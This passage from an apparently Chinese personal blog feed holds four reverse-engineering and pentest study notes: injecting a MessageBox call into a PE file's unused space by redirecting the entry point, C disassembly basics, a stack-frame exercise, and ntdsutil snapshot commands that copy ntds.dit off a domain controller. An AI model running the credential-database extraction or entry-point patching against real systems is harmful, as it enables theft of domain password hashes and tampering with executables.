class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 地址 #  #   硬编码   #    #                函数                #   #   跳转地址  #</span><br><span class="line">00F71723 E8 E0 FA FF FF    call    @__CheckForDebuggerJustMyCode@4    (0F71208h)</span><br><span class="line">00F71208 E9 63 05 00 00    jmp     __CheckForDebuggerJustMyCode       (0F71770h)</span><br></pre></td></tr></table></figure></p><p>我们可以看出 call命令对应的硬编码为E8，jmp对应的硬编码为E9。那么硬编码后面的四位，和我们跳转的地址是 如何和进行转换的呢。</p><p>上公式：<br><strong>真正要跳转的地址 = E8这条命令的下一行地址 + E8后面的四位</strong></p><p>我们看上面的图可以带入公式里面验证一下</p><p>00F71208 = 00F71728 + FFFFFAE0<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/calc.png" alt></p><p>我们使用计算器计算，发现结论正确。</p><p>又∵ <strong>E8这条命令的下一行地址 = E8的地址 + 硬编码的长度</strong></p><p>所以这条命令就可以变成：</p><p><strong>真正要跳转的地址 = E8的地址 + 硬编码的长度 + E8后面的四位</strong></p><h1 id="写入OEP的代码"><a href="#写入OEP的代码" class="headerlink" title="写入OEP的代码"></a>写入OEP的代码</h1><p>因为我们的程序最终是要用记事本的方式打开修改其中的十六进制数，所以我们不能直接写汇编代码进去的<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/6a.png" alt><br>从反汇编后的汇编代码我们可以看出，首先我们的代码做了4个push，也就是MessageBox这个函数传入的四个参数，我们这里由于全部都是0，所以我们对应push的值也是0<br>最终我们将会加入在OEP后面的十六进制为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6A 00 6A 00 6A 00 6A 00 E8 .. .. .. .. E9 .. .. .. ..</span><br></pre></td></tr></table></figure></p><h1 id="找到文件中的MessageBox地址"><a href="#找到文件中的MessageBox地址" class="headerlink" title="找到文件中的MessageBox地址"></a>找到文件中的MessageBox地址</h1><p>我们的逻辑是这样的，开始运行之后首先跳转到MessageBox，然后jmp到开始的位置重新开始</p><p>这里我拿任意一个软件做例子，用OD打开，然后再右下角输入 <strong>bp MessageBoxA</strong>，点击菜单栏中的那个 <strong>B</strong> 按钮，我们就能发现MessageBox在这个程序中跳转的地址。</p><p>此处的程序为 75D90F40<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/bp.png" alt></p><h1 id="找到我们写入代码的空白区"><a href="#找到我们写入代码的空白区" class="headerlink" title="找到我们写入代码的空白区"></a>找到我们写入代码的空白区</h1><p>我这里打开的程序，这里用PETOOLS观察第一个节的相关数据<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/PE.png" alt><br>这个时候我们要写入的数据空白处开始的位置就是 十六进制的 002558D7 + 400</p><p>所以在这个计算后的位置我们开始写入上面的代码，如图，这里还有E8/E9后面的数没有写<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/6AA.png" alt></p><h1 id="通过公式计算出最终写入的代码"><a href="#通过公式计算出最终写入的代码" class="headerlink" title="通过公式计算出最终写入的代码"></a>通过公式计算出最终写入的代码</h1><p>E8:255ce8<br>E9:255ced<br>E8下一行地址：<br>E9下一行地址：<br>MessageBox:75B50F40<br>ImageBase:00400000<br>OEP:002085D8</p><p>E8下一行地址相对PointerToRawData偏移量：0x255ce8+5-0x400=0x2558E8+5<br>映射到内存中，E8下一行地址：ImageBase+VirtualAddress + 0x2558E8+5= 6568E8<br>E8后面的值：MessageBox - 0x6568E8-5 = 0x754FA658 0x754FA653</p><p>计算E9后面的值：<br>原来OEP:ImageBase + AddressOfEntryPoint = 6085D8</p><p>文件中，E9下一行地址相对PointerToRawData偏移量：0x255ced-0x400=0x2558ed +5</p><p>映射到内存中，E9下一行地址：ImageBase + VirtualAddress + 0x2558ed =6568ed</p><p>E9后面的值：MessageBox - 6568ed = 754FA653 754FA64E</p><p>修改OEP:<br>文件中shellcode起始地址相对PointerToRawData偏移量：255ce0 - 400 = 2558E0<br>映射到内存中相对ImageBase偏移：VitualAddress + 2558E0 = 2568e0</p><p>编写就完事了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好久没写blog了，但是一直有在学逆向，就是不晓得写什么，感觉很多都是很基础的东西，写的价值不大。&lt;/p&gt;
&lt;p&gt;这里看着教程做了个小小的程序改动，这里自己也来尝试一下吧。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前置知识：逆向、PE结构、进制&lt;/li&gt;
&lt;li&gt;实现目的：修改OEP(即
      
    
    </summary>
    
    
    
      <category term="逆向" scheme="http://sherlocz.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>C语言逆向基础</title>
    <link href="http://sherlocz.github.io/2020/03/03/C%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    <id>http://sherlocz.github.io/2020/03/03/C语言逆向基础/</id>
    <published>2020-03-03T12:45:58.000Z</published>
    <updated>2020-03-04T13:09:07.850Z</updated>
    
    <content type="html"><![CDATA[<p>C语言反汇编后的代码学习</p><p>C语言的基本数据类型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">char1byte</span><br><span class="line">short2byte</span><br><span class="line">int4byte</span><br><span class="line">long4byte</span><br><span class="line">float4byte</span><br><span class="line">double8byte</span><br></pre></td></tr></table></figure></p><p>汇编堆栈图：<br><img src="/2020/03/03/C语言逆向基础/dzt.png" alt></p><p>从图中我们可以看出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[EBP-4n]局部变量</span><br><span class="line">[EBP+4]返回值</span><br><span class="line">[EBP+8]参数</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><h1 id="利用vs进行反汇编"><a href="#利用vs进行反汇编" class="headerlink" title="利用vs进行反汇编"></a>利用vs进行反汇编</h1><p>首先编写好C语言代码，然后设置断点，F5编译，最后调试-&gt;窗口-&gt;反汇编(寄存器)查看我们想要的东西</p><h1 id="返回值反汇编分析"><a href="#返回值反汇编分析" class="headerlink" title="返回值反汇编分析"></a>返回值反汇编分析</h1><h2 id="char类型的返回值"><a href="#char类型的返回值" class="headerlink" title="char类型的返回值"></a>char类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/char.png" alt><br>反汇编之后我们发现，返回值保存在了al寄存器中<br><img src="/2020/03/03/C语言逆向基础/al.png" alt></p><h2 id="short类型的返回值"><a href="#short类型的返回值" class="headerlink" title="short类型的返回值"></a>short类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/short.png" alt><br>反汇编之后我们发现，返回值保存在了ax寄存器中<br><img src="/2020/03/03/C语言逆向基础/ax.png" alt></p><h2 id="int类型的返回值"><a href="#int类型的返回值" class="headerlink" title="int类型的返回值"></a>int类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/int.png" alt><br>反汇编之后我们发现，返回值保存在了ax寄存器中<br><img src="/2020/03/03/C语言逆向基础/eax.png" alt></p><h1 id="数组反汇编分析"><a href="#数组反汇编分析" class="headerlink" title="数组反汇编分析"></a>数组反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/array_1.png" alt><br><img src="/2020/03/03/C语言逆向基础/array.png" alt><br>特点：等宽连续</p><h1 id="结构体反汇编分析"><a href="#结构体反汇编分析" class="headerlink" title="结构体反汇编分析"></a>结构体反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/jgt.png" alt><br><img src="/2020/03/03/C语言逆向基础/jgtt.png" alt><br>特点：不一定等宽但一定连续</p><h1 id="if语句反汇编分析"><a href="#if语句反汇编分析" class="headerlink" title="if语句反汇编分析"></a>if语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/if.png" alt><br><img src="/2020/03/03/C语言逆向基础/iff.png" alt><br>其实if的反汇编就是jcc判断跳转到哪里的内存地址</p><h1 id="do-while语句反汇编分析"><a href="#do-while语句反汇编分析" class="headerlink" title="do..while语句反汇编分析"></a>do..while语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/do_while.png" alt><br><img src="/2020/03/03/C语言逆向基础/do_whilee.png" alt></p><h1 id="for语句反汇编分析"><a href="#for语句反汇编分析" class="headerlink" title="for语句反汇编分析"></a>for语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/forr.png" alt><br>这里可以调试看的更加的清楚，首先跳转到for循环内部，然后将x的值传给eax再传给[ebp-8]也就是参数，第一次会直接跳到和y相比较，比较大小如果比y小则会跳转到printf那里，然后会[add esp,8] 这里的意思是删除栈顶的两个参数x,y，然后跳入到for循环内部，这个时候第二次进入x+1，也就是i++，后面一直循环这个操作，直到x&gt;y为止。</p><h1 id="switch语句反汇编分析"><a href="#switch语句反汇编分析" class="headerlink" title="switch语句反汇编分析"></a>switch语句反汇编分析</h1><h2 id="case-lt-3"><a href="#case-lt-3" class="headerlink" title="case&lt;=3"></a>case&lt;=3</h2><p><img src="/2020/03/03/C语言逆向基础/case3.png" alt><br><img src="/2020/03/03/C语言逆向基础/case33.png" alt><br>当我们的case情况较少的时候，发现反汇编的代码和我们if..else的反汇编代码一样，都是通过jcc比较跳转地址</p><p>##case&gt;3##<br>这里的情况复杂一些<br><img src="/2020/03/03/C语言逆向基础/case4.png" alt><br><img src="/2020/03/03/C语言逆向基础/case44.png" alt><br>反汇编的时候我们看见，首先将我们传入的参数复制给了eax，然后将eax的值给了[ebp-0C4h],最后给了ecx，然后ecx-1,最后又传回给了[ebp-0C4h]，然后这里我们与3进行比较，若比3大，则会跳转到0DA436Ah(直接跳出判断语句，因为这里switch的最大值为4,若减了1还比4大，则就会进入default)，若这个条件不成立，则会将值赋给edx，跳转到[edx*4+0DA4380h]。</p><p>这里反汇编里面搞了这么多的骚操作，原因是为了减少判断的次数直接判断出进入哪一个case，害。</p><p>当然，这里的sub并不是每次都是1，这里和你case中的数是相关的。</p><p>而switch的反汇编是非常复杂的，是编译器来进行了操作，编译器非常的聪明，这里就不一一分析了。</p><p>写的非常粗糙，害。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;C语言反汇编后的代码学习&lt;/p&gt;
&lt;p&gt;C语言的基本数据类型：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;spa
      
    
    </summary>
    
    
    
      <category term="汇编" scheme="http://sherlocz.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Windows下ntds.dit的利用</title>
    <link href="http://sherlocz.github.io/2020/02/28/Windows%E4%B8%8Bntds-dit%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://sherlocz.github.io/2020/02/28/Windows下ntds-dit的利用/</id>
    <published>2020-02-28T12:14:10.000Z</published>
    <updated>2020-02-28T12:40:39.121Z</updated>
    
    <content type="html"><![CDATA[<p>ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。</p><p><img src="/2020/02/28/Windows下ntds-dit的利用/n.png" alt><br>无法直接读取</p><p>记笔记记笔记~</p><h1 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h1><ul><li>ntdsutil.exe: Windows Server 2003/08/12</li><li>vssadmin: Windows 7/Windows Server 2008</li></ul><p>这里用12的机器做示范：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit//创建一个快照</span><br></pre></td></tr></table></figure><p>快照包含Windows中的所有文件，并且复制的时候不会影响Windows本机，也不会受到限制<br><img src="/2020/02/28/Windows下ntds-dit的利用/1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit//加载快照</span><br></pre></td></tr></table></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/2.png" alt><br>这个时候会映射出一个文件夹出来，GUID为每次生成镜像的GUID</p><p>然后用命令将ntds.dit复制出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202002282030_VOLUMEC$\windows\ntds\ntds.dit</span><br><span class="line"> c:\temp\ntds.dit</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/3.png" alt></p><p>最后删除卸载快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/4.png" alt></p><p>执行以下命令，若List为空，则说明卸载成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/5.png" alt></p><p>这就是ntdsutil的用法，win7下没有这个工具，需要利用vssadmin，这里没有win7域控的环境就先不搞了<br><img src="/2020/02/28/Windows下ntds-dit的利用/win7.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/02/28/Windows下ntds-dit的利用/n.png&quot; alt&gt;&lt;b
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>堆栈图练习</title>
    <link href="http://sherlocz.github.io/2020/02/26/%E5%A0%86%E6%A0%88%E5%9B%BE%E7%BB%83%E4%B9%A0/"/>
    <id>http://sherlocz.github.io/2020/02/26/堆栈图练习/</id>
    <published>2020-02-26T12:50:21.000Z</published>
    <updated>2020-02-28T06:04:00.553Z</updated>
    
    <content type="html"><![CDATA[<p>最近学了好多东西但是懒得写，感觉太懒了，最近学习了堆栈，实在是东西太多啦，这里做个笔记，也没啥观赏性。</p><ul><li>DTDebug</li><li>HelloWorld.exe</li></ul><p>目标开始地址：0x401168<br><img src="/2020/02/26/堆栈图练习/1.png" alt><br>从这个地址的三行汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH 2//将十六进制的2存储到堆栈中</span><br><span class="line">PUSH 1//将十六进制的1存储到堆栈中</span><br><span class="line">CALL HelloWor.0040100A//goto这个地址</span><br></pre></td></tr></table></figure></p><p>这里的栈顶和栈底(也就是ESP和EBP的值):<br>ESP 0019FFE4<br>EBP 0019FF30 </p><p>call命令的时候会存入一个内存地址，就是call这行的内存地址加上占用的字节，这里call命令占用了5个字节，所以将会在堆栈中保存当前内存+5的地址，也就是会保存(0040116C+5)401171</p><p>call命令会将call后面的地址给EIP并会跳转到这个地址，所以我们的EIP地址将会为0040100A</p><p>由于push和call的时候要入栈，所以这里我们的栈顶的值会变化</p><p>所以我们这里可以画出堆栈图<br><img src="/2020/02/26/堆栈图练习/2.png" alt></p><p>然后跳转到了40100A地址，这一行看到了JMP<br><img src="/2020/02/26/堆栈图练习/3.png" alt></p><p>JMP命令只会修改EIP的值，堆栈并不改变，然后会继续走下去到401040<br><img src="/2020/02/26/堆栈图练习/4.png" alt></p><p>这里接下来一直到RETN就是我们剩下要分析的汇编代码</p><p>首先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP</span><br></pre></td></tr></table></figure></p><p>将EBP的值入栈，栈顶的值-4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV EBP,ESP</span><br></pre></td></tr></table></figure><p>将ESP的值赋予给EBP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUB ESP,40</span><br></pre></td></tr></table></figure><p>ESP的值减去十六进制的四十，这里其实就是栈顶要增加，这一步的原因是为了流出缓存出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBX</span><br><span class="line">PUSH ESP</span><br><span class="line">PUSH EDI</span><br></pre></td></tr></table></figure><p>将 EBX、ESP、EDI的值入栈，栈顶+12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEA EDI,DWORD PTR SS:[EBP-40]</span><br></pre></td></tr></table></figure><p>将EBP-40的地址赋值给EDI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV ECX,10</span><br><span class="line">MOV EAX,CCCCCCCC</span><br><span class="line">REP STOS DWORD PTR ES:[EDI]</span><br></pre></td></tr></table></figure><p>这一步的目的是为了清除多余的垃圾缓存，重复十次，将值赋值成CCCCCCCC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX,DWORD PTR SS:[EBP+8]</span><br><span class="line">ADD EAX,DWORD PTR SS:[EBP+C]</span><br></pre></td></tr></table></figure><p>这两步的意思就是将我们刚存进来的1和2相加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POP EDI</span><br><span class="line">POP ESI</span><br><span class="line">POP EBX</span><br><span class="line">MOV ESP,EBP</span><br><span class="line">POP EBP</span><br><span class="line">RETN</span><br></pre></td></tr></table></figure><p>清除缓存，就不详细分析了</p><p>这里就会返回到刚开始CALL后的下一行<br><img src="/2020/02/26/堆栈图练习/4.png" alt><br>这里有一个ADD操作，因为到这一步的时候栈顶和栈底的值和刚开始的时候不一样，要恢复成刚开始的样子，这一步叫做堆栈平衡</p><p>完~</p><p>图不画了~懒<br><img src="/2020/02/26/堆栈图练习/6.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近学了好多东西但是懒得写，感觉太懒了，最近学习了堆栈，实在是东西太多啦，这里做个笔记，也没啥观赏性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DTDebug&lt;/li&gt;
&lt;li&gt;HelloWorld.exe&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;目标开始地址：0x401168&lt;br&gt;&lt;img sr
      
    
    </summary>
    
    
    
      <category term="汇编" scheme="http://sherlocz.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="逆向" scheme="http://sherlocz.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
